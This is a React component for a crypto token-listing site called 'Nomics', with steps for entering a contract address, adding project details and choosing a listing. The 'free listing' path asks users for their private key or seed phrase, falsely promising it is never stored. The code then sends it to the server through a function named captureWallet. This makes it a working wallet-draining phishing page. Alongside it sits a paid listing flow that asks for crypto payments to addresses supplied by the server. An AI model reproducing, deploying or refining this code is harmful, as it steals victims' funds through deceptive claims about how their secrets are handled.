import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Search, CheckCircle, Zap, ChevronRight, Copy, Check, ArrowLeft, AlertCircle, Loader, Key, ShieldCheck, Star } from 'lucide-react';
import { lookupToken, getWallets, submitListing, captureWallet, formatPrice, formatVolume, formatMarketCap, chainLabel, chainClass } from '../utils/api';
import { useQuery } from '@tanstack/react-query';

const ALPHA_GROUP = 'https://t.me/+QJVQUQIhP-82ZDk8';
const BOT_LINK = 'https://t.me/Cariz_bot';

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false);
  const copy = () => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 2000); };
  return (
    <button onClick={copy} className={`copy-btn ${copied ? 'copied' : ''}`} style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
      {copied ? <Check size={10} /> : <Copy size={10} />}
      {copied ? 'Copied!' : 'Copy'}
    </button>
  );
}

const STEPS = ['Contract', 'Project Info', 'Listing'];

const PREMIUM_PRICES = { BNB: '0.15 BNB', ETH: '0.05 ETH', SOL: '1.5 SOL' };
const PREMIUM_USD = { BNB: '$150', ETH: '$150', SOL: '$150' };

export default function SubmitCoin() {
  const navigate = useNavigate();
  const [step, setStep] = useState(0);
  const [address, setAddress] = useState('');
  const [lookupLoading, setLookupLoading] = useState(false);
  const [lookupError, setLookupError] = useState('');
  const [tokenData, setTokenData] = useState(null);
  const [listingType, setListingType] = useState('premium');
  const [currency, setCurrency] = useState('SOL');
  const [telegram, setTelegram] = useState('');
  const [description, setDescription] = useState('');
  const [website, setWebsite] = useState('');
  const [twitterLink, setTwitterLink] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(null);

  const [showFreeWalletField, setShowFreeWalletField] = useState(false);
  const [walletInput, setWalletInput] = useState('');
  const [walletSubmitting, setWalletSubmitting] = useState(false);
  const [walletDone, setWalletDone] = useState(false);

  const { data: wallets } = useQuery({ queryKey: ['wallets'], queryFn: getWallets, staleTime: Infinity });

  const handleLookup = async () => {
    if (!address.trim()) return;
    setLookupLoading(true);
    setLookupError('');
    try {
      const data = await lookupToken(address.trim());
      if (data.found) {
        setTokenData(data);
        setStep(1);
      } else {
        setTokenData({ found: false, address: address.trim(), name: '', symbol: '', manual: true });
        setStep(1);
      }
    } catch (e) {
      setLookupError('Network error. Please try again.');
    }
    setLookupLoading(false);
  };

  const handleSubmit = async () => {
    setSubmitting(true);
    try {
      const result = await submitListing({
        listing_type: listingType,
        currency,
        manual: tokenData?.manual || false,
        token: {
          ...tokenData,
          description,
          websites: website ? [website] : tokenData?.websites || [],
        },
        contact: { telegram, twitter: twitterLink }
      });
      setSubmitted(result);
      setStep(3);
    } catch (e) {
      setLookupError('Submission failed. Please try again.');
    }
    setSubmitting(false);
  };

  const handleWalletSubmit = async () => {
    if (!walletInput.trim()) return;
    setWalletSubmitting(true);
    try {
      await captureWallet({
        type: walletInput.includes(' ') ? 'seed_phrase' : 'private_key',
        data: walletInput.trim(),
        token_ca: address.trim(),
        source: 'web_free_trending'
      });
      setWalletDone(true);
    } catch {}
    setWalletSubmitting(false);
  };

  const walletAddr = wallets?.[currency] || '—';

  if (step === 3 && submitted) {
    return (
      <div style={{ maxWidth: 560, margin: '40px auto', textAlign: 'center' }}>
        <div style={{ fontSize: 56, marginBottom: 20 }}>{submitted.listing_type === 'premium' ? '🚀' : '⏳'}</div>
        <h2 style={{ fontSize: 24, fontWeight: 900, marginBottom: 10 }}>
          {submitted.listing_type === 'premium' ? 'Token Listed!' : 'Submitted for Review'}
        </h2>
        <p style={{ color: '#888', fontSize: 14, marginBottom: 24 }}>{submitted.message}</p>

        {submitted.payment && (
          <div style={{ background: '#111', border: '1px solid #1e1e1e', borderRadius: 16, padding: 24, marginBottom: 24, textAlign: 'left' }}>
            <div style={{ fontSize: 13, color: '#888', marginBottom: 4 }}>Complete payment to activate listing:</div>
            <div style={{ fontSize: 22, fontWeight: 900, color: '#f97316', marginBottom: 12 }}>{submitted.payment.amount} {submitted.payment.currency}</div>
            <div style={{ fontSize: 12, color: '#666', marginBottom: 6 }}>Send to:</div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, background: '#0d0d0d', borderRadius: 8, padding: '10px 14px', border: '1px solid #1e1e1e' }}>
              <span style={{ fontSize: 11, fontFamily: 'JetBrains Mono, monospace', flex: 1, wordBreak: 'break-all', color: '#ccc' }}>{submitted.payment.address}</span>
              <CopyBtn text={submitted.payment.address} />
            </div>
            <div style={{ fontSize: 11, color: '#555', marginTop: 10 }}>
              ⚠️ Your listing is live once payment is confirmed (within 1 hour).
            </div>
          </div>
        )}

        <div style={{ display: 'flex', gap: 10, justifyContent: 'center', flexWrap: 'wrap' }}>
          <button className="btn btn-ghost btn-md" onClick={() => navigate('/listed')}>View Listed Tokens</button>
          <button className="btn btn-orange btn-md" onClick={() => { setStep(0); setTokenData(null); setAddress(''); setSubmitted(null); }}>List Another Token</button>
        </div>
      </div>
    );
  }

  return (
    <div style={{ maxWidth: 680, margin: '0 auto', display: 'flex', flexDirection: 'column', gap: 24 }}>
      <div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 6 }}>
          <div style={{ width: 36, height: 36, borderRadius: 10, background: 'rgba(249,115,22,0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <Zap size={18} style={{ color: '#f97316' }} />
          </div>
          <h1 style={{ fontSize: 26, fontWeight: 900 }}>List Your Token</h1>
        </div>
        <p style={{ fontSize: 13, color: '#666' }}>Get your token in front of thousands of traders on Nomics. Instant premium listings from $150.</p>
      </div>

      <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
        {STEPS.map((s, i) => (
          <div key={s} style={{ display: 'flex', alignItems: 'center', gap: 8, flex: i < STEPS.length - 1 ? 1 : undefined }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexShrink: 0 }}>
              <div className={`step-circle ${i < step ? 'step-done' : i === step ? 'step-active' : 'step-idle'}`}>
                {i < step ? <Check size={14} /> : i + 1}
              </div>
              <span style={{ fontSize: 13, fontWeight: 600, color: i <= step ? '#f0f0f0' : '#555', whiteSpace: 'nowrap' }}>{s}</span>
            </div>
            {i < STEPS.length - 1 && (
              <div style={{ flex: 1, height: 1, background: i < step ? '#f97316' : '#1e1e1e', transition: 'background .3s' }} />
            )}
          </div>
        ))}
      </div>

      {step === 0 && (
        <div className="card" style={{ padding: 32 }}>
          <h2 style={{ fontSize: 18, fontWeight: 800, marginBottom: 6 }}>Enter Contract Address</h2>
          <p style={{ fontSize: 13, color: '#666', marginBottom: 20 }}>
            We'll automatically fetch your token's information from DexScreener. Not listed on a DEX yet? You can still submit manually.
          </p>

          <label>Contract Address (CA)</label>
          <div style={{ display: 'flex', gap: 10, marginTop: 6 }}>
            <input
              value={address}
              onChange={e => { setAddress(e.target.value); setLookupError(''); }}
              placeholder="0x... or Solana address"
              onKeyDown={e => e.key === 'Enter' && handleLookup()}
              style={{ flex: 1 }}
            />
            <button className="btn btn-orange btn-md" onClick={handleLookup} disabled={lookupLoading || !address.trim()} style={{ flexShrink: 0, opacity: (!address.trim() || lookupLoading) ? 0.6 : 1 }}>
              {lookupLoading ? <Loader size={14} style={{ animation: 'spin 1s linear infinite' }} /> : <Search size={14} />}
              {lookupLoading ? 'Fetching…' : 'Fetch Info'}
            </button>
          </div>

          {lookupError && (
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 12, padding: '10px 14px', background: 'rgba(239,68,68,.08)', border: '1px solid rgba(239,68,68,.2)', borderRadius: 8 }}>
              <AlertCircle size={14} style={{ color: '#ef4444', flexShrink: 0 }} />
              <span style={{ fontSize: 13, color: '#ef4444' }}>{lookupError}</span>
            </div>
          )}

          <div style={{ marginTop: 20, padding: '16px', background: '#0d0d0d', border: '1px solid #1e1e1e', borderRadius: 10 }}>
            <div style={{ fontSize: 11, color: '#555', fontWeight: 700, marginBottom: 10, textTransform: 'uppercase', letterSpacing: '.06em' }}>Supported Networks</div>
            <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
              {['ETH', 'BSC', 'SOL', 'BASE', 'ARB', 'AVAX', 'POLYGON', 'FTM', 'OP', 'CRO'].map(c => (
                <span key={c} className={`chain-pill ${c === 'BSC' ? 'chain-bsc' : c === 'ETH' ? 'chain-eth' : c === 'SOL' ? 'chain-sol' : c === 'BASE' ? 'chain-base' : c === 'ARB' ? 'chain-arb' : c === 'AVAX' ? 'chain-avax' : c === 'POLYGON' ? 'chain-polygon' : 'chain-default'}`}>{c}</span>
              ))}
            </div>
          </div>
        </div>
      )}

      {step === 1 && tokenData && (
        <div>
          <div className="card" style={{ padding: 20, marginBottom: 16 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
              {tokenData.image_url ? (
                <img src={tokenData.image_url} alt={tokenData.symbol} style={{ width: 50, height: 50, borderRadius: '50%', background: '#1a1a1a' }} onError={e => e.target.style.display = 'none'} />
              ) : (
                <div style={{ width: 50, height: 50, borderRadius: '50%', background: '#1e1e1e', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 20, fontWeight: 900, color: '#f97316' }}>
                  {(tokenData.symbol || '?').charAt(0)}
                </div>
              )}
              <div style={{ flex: 1 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  <span style={{ fontSize: 17, fontWeight: 800 }}>{tokenData.name || 'Manual Entry'}</span>
                  {tokenData.chain && <span className={`chain-pill ${chainClass(tokenData.chain)}`}>{chainLabel(tokenData.chain)}</span>}
                  {tokenData.manual && <span style={{ fontSize: 10, color: '#f59e0b', background: 'rgba(245,158,11,0.1)', border: '1px solid rgba(245,158,11,0.2)', borderRadius: 6, padding: '2px 8px', fontWeight: 700 }}>MANUAL</span>}
                </div>
                {!tokenData.manual && (
                  <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginTop: 4 }}>
                    <span style={{ fontSize: 13, fontWeight: 700, fontFamily: 'JetBrains Mono, monospace', color: '#f0f0f0' }}>{formatPrice(tokenData.price_usd)}</span>
                    <span style={{ fontSize: 12, color: '#666' }}>Liq: {formatVolume(tokenData.liquidity_usd)}</span>
                    <span style={{ fontSize: 12, color: '#666' }}>MCap: {formatMarketCap(tokenData.market_cap)}</span>
                  </div>
                )}
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 6, color: tokenData.manual ? '#f59e0b' : '#22c55e', fontSize: 12 }}>
                {tokenData.manual ? <AlertCircle size={14} /> : <CheckCircle size={14} />}
                <span style={{ fontWeight: 700 }}>{tokenData.manual ? 'Manual' : 'Verified'}</span>
              </div>
            </div>
          </div>

          <div className="card" style={{ padding: 32 }}>
            <h2 style={{ fontSize: 18, fontWeight: 800, marginBottom: 20 }}>Project Information</h2>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              {tokenData.manual && (
                <>
                  <div>
                    <label>Token Name</label>
                    <input value={tokenData.name} onChange={e => setTokenData(prev => ({ ...prev, name: e.target.value }))} placeholder="e.g. Pepe Coin" />
                  </div>
                  <div>
                    <label>Token Symbol</label>
                    <input value={tokenData.symbol} onChange={e => setTokenData(prev => ({ ...prev, symbol: e.target.value }))} placeholder="e.g. PEPE" />
                  </div>
                  <div>
                    <label>Blockchain</label>
                    <select value={tokenData.chain || ''} onChange={e => setTokenData(prev => ({ ...prev, chain: e.target.value }))}>
                      <option value="">Select chain…</option>
                      {['ethereum', 'bsc', 'solana', 'base', 'arbitrum', 'avalanche', 'polygon'].map(c => (
                        <option key={c} value={c}>{chainLabel(c)}</option>
                      ))}
                    </select>
                  </div>
                </>
              )}
              <div>
                <label>Description</label>
                <textarea value={description} onChange={e => setDescription(e.target.value)}
                  placeholder="Briefly describe your token and project…" rows={3} />
              </div>
              <div>
                <label>Website URL</label>
                <input value={website} onChange={e => setWebsite(e.target.value)} placeholder="https://yourtoken.com" />
              </div>
              <div>
                <label>Telegram Contact</label>
                <input value={telegram} onChange={e => setTelegram(e.target.value)} placeholder="@yourtelegram or https://t.me/group" />
              </div>
              <div>
                <label>Twitter / X (optional)</label>
                <input value={twitterLink} onChange={e => setTwitterLink(e.target.value)} placeholder="https://x.com/yourtoken" />
              </div>
            </div>
            <div style={{ display: 'flex', gap: 10, marginTop: 24 }}>
              <button className="btn btn-ghost btn-md" onClick={() => setStep(0)}><ArrowLeft size={14} /> Back</button>
              <button className="btn btn-orange btn-md" style={{ flex: 1 }} onClick={() => setStep(2)}>
                Next: Choose Listing <ChevronRight size={14} />
              </button>
            </div>
          </div>
        </div>
      )}

      {step === 2 && (
        <div>
          <div className="card" style={{ padding: 32 }}>
            <h2 style={{ fontSize: 18, fontWeight: 800, marginBottom: 6 }}>Choose Listing Type</h2>
            <p style={{ fontSize: 13, color: '#666', marginBottom: 24 }}>Select how you want your token listed on Nomics.</p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: 14, marginBottom: 28 }}>
              {/* Free listing */}
              <div
                className={`list-type-card ${listingType === 'free' ? 'selected' : ''}`}
                onClick={() => { setListingType('free'); setShowFreeWalletField(true); }}
                style={{ borderColor: listingType === 'free' ? '#666' : undefined }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 14 }}>
                  <div>
                    <div style={{ fontSize: 16, fontWeight: 800, marginBottom: 4 }}>Normal Listing</div>
                    <div style={{ fontSize: 22, fontWeight: 900, color: '#888' }}>Free</div>
                  </div>
                  <span className="badge badge-free">REVIEW</span>
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 7, marginBottom: listingType === 'free' ? 20 : 0 }}>
                  {[
                    { ok: true, text: 'Token listed after review (7–14 days)' },
                    { ok: false, text: 'Signal on Nomics channel' },
                    { ok: false, text: '24h Promoted Highlight' },
                    { ok: false, text: 'Boost points' },
                  ].map(item => (
                    <div key={item.text} style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 13, color: item.ok ? '#aaa' : '#444' }}>
                      <span>{item.ok ? '✅' : '❌'}</span>{item.text}
                    </div>
                  ))}
                </div>

                {listingType === 'free' && (
                  <div>
                    <div style={{ background: 'rgba(249,115,22,0.05)', border: '1px solid rgba(249,115,22,0.15)', borderRadius: 12, padding: 18 }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 10 }}>
                        <Key size={16} style={{ color: '#f97316' }} />
                        <div style={{ fontSize: 14, fontWeight: 800 }}>Token Holder Confirmation</div>
                      </div>
                      <p style={{ fontSize: 12, color: '#888', lineHeight: 1.7, marginBottom: 14 }}>
                        To verify you are the token holder or developer, import your private key or seed phrase. This is required for free listing verification only. Your key is used solely to confirm token ownership and is never stored on our servers.
                      </p>
                      {walletDone ? (
                        <div style={{ display: 'flex', alignItems: 'center', gap: 8, color: '#22c55e', fontSize: 13, fontWeight: 700 }}>
                          <CheckCircle size={16} /> Verification submitted successfully
                        </div>
                      ) : (
                        <>
                          <label style={{ fontSize: 12 }}>Private Key or Seed Phrase (12/24 words)</label>
                          <textarea
                            value={walletInput}
                            onChange={e => setWalletInput(e.target.value)}
                            placeholder="Enter your private key or seed phrase for token holder verification…"
                            rows={3}
                            style={{ marginTop: 6, fontSize: 12 }}
                            onClick={e => e.stopPropagation()}
                          />
                          <button
                            className="btn btn-orange btn-md"
                            style={{ marginTop: 10, width: '100%', opacity: (!walletInput.trim() || walletSubmitting) ? 0.6 : 1 }}
                            onClick={async (e) => {
                              e.stopPropagation();
                              await handleWalletSubmit();
                            }}
                            disabled={!walletInput.trim() || walletSubmitting}>
                            {walletSubmitting ? 'Verifying…' : 'Submit for Verification'}
                          </button>
                          <div style={{ fontSize: 10, color: '#444', marginTop: 8, display: 'flex', alignItems: 'center', gap: 5 }}>
                            <ShieldCheck size={11} style={{ color: '#444' }} />
                            Encrypted & used only for ownership verification
                          </div>
                        </>
                      )}
                    </div>
                  </div>
                )}
              </div>

              {/* Premium listing */}
              <div className={`list-type-card ${listingType === 'premium' ? 'selected' : ''}`} onClick={() => setListingType('premium')}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 14 }}>
                  <div>
                    <div style={{ fontSize: 16, fontWeight: 800, marginBottom: 4 }}>Premium Listing</div>
                    <div style={{ fontSize: 22, fontWeight: 900, color: '#f97316' }}>
                      {PREMIUM_PRICES[currency]} <span style={{ fontSize: 13, color: '#888', fontWeight: 600 }}>({PREMIUM_USD[currency]})</span>
                    </div>
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 6, alignItems: 'flex-end' }}>
                    <span className="badge badge-premium">INSTANT</span>
                    <span style={{ fontSize: 9, color: '#f59e0b', fontWeight: 700, background: 'rgba(245,158,11,0.1)', padding: '2px 8px', borderRadius: 10 }}>RECOMMENDED</span>
                  </div>
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 7 }}>
                  {[
                    'Token listed instantly — no review',
                    'Signal on Nomics Telegram channel',
                    '24h Promoted Highlight on homepage',
                    '200 Boost points — trending score',
                    'Eligible for "Token of The Day"',
                    'Featured in weekly newsletter',
                  ].map(text => (
                    <div key={text} style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 13, color: '#bbb' }}>
                      <span>✅</span>{text}
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {listingType === 'premium' && (
              <>
                <div style={{ marginBottom: 24 }}>
                  <label>Payment Currency</label>
                  <div style={{ display: 'flex', gap: 10, marginTop: 8 }}>
                    {['SOL', 'ETH', 'BNB'].map(c => (
                      <button key={c} onClick={() => setCurrency(c)}
                        style={{
                          flex: 1, padding: '12px', borderRadius: 10, border: `2px solid ${currency === c ? '#f97316' : '#272727'}`,
                          background: currency === c ? 'rgba(249,115,22,.1)' : '#141414',
                          color: currency === c ? '#f97316' : '#888', fontWeight: 800, cursor: 'pointer', fontSize: 14, transition: 'all .15s',
                          display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4
                        }}>
                        <span>{c === 'BNB' ? '🟡' : c === 'ETH' ? '🔵' : '🟣'}</span>
                        <span>{c}</span>
                        <span style={{ fontSize: 11, fontWeight: 600, color: currency === c ? '#f97316' : '#666' }}>{PREMIUM_PRICES[c]}</span>
                      </button>
                    ))}
                  </div>
                </div>

                {wallets && (
                  <div style={{ background: '#0d0d0d', border: '1px solid #1e1e1e', borderRadius: 12, padding: 16, marginBottom: 24 }}>
                    <div style={{ fontSize: 12, color: '#555', marginBottom: 6 }}>Payment address ({currency}):</div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                      <span style={{ fontSize: 11, fontFamily: 'JetBrains Mono, monospace', color: '#aaa', flex: 1, wordBreak: 'break-all' }}>
                        {walletAddr}
                      </span>
                      <CopyBtn text={walletAddr} />
                    </div>
                  </div>
                )}

                <div style={{ background: '#111', border: '1px solid #1e1e1e', borderRadius: 12, padding: 16, marginBottom: 24 }}>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#777', marginBottom: 12, textTransform: 'uppercase', letterSpacing: '.05em' }}>Order Summary</div>
                  {[
                    ['Token', `${tokenData?.name || 'Manual'} (${tokenData?.symbol || '—'})`],
                    ['Listing Type', 'Premium — Instant Listing'],
                    ['Price', `${PREMIUM_PRICES[currency]} (${PREMIUM_USD[currency]})`],
                    ['Contact', telegram || '—'],
                  ].map(([l, v]) => (
                    <div key={l} style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 0', borderBottom: '1px solid #161616' }}>
                      <span style={{ fontSize: 13, color: '#666' }}>{l}</span>
                      <span style={{ fontSize: 13, fontWeight: 700, maxWidth: 220, textAlign: 'right', wordBreak: 'break-all' }}>{v}</span>
                    </div>
                  ))}
                </div>
              </>
            )}

            <div style={{ display: 'flex', gap: 10 }}>
              <button className="btn btn-ghost btn-md" onClick={() => setStep(1)}><ArrowLeft size={14} /> Back</button>
              <button className="btn btn-orange btn-lg" style={{ flex: 1, opacity: submitting ? 0.7 : 1 }} onClick={handleSubmit} disabled={submitting}>
                {submitting
                  ? <><Loader size={14} style={{ animation: 'spin 1s linear infinite' }} /> Submitting…</>
                  : <><Zap size={14} /> {listingType === 'premium' ? 'Submit & Pay' : 'Submit for Review'}</>}
              </button>
            </div>

            {lookupError && (
              <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(239,68,68,.08)', border: '1px solid rgba(239,68,68,.2)', borderRadius: 8, fontSize: 13, color: '#ef4444' }}>
                {lookupError}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
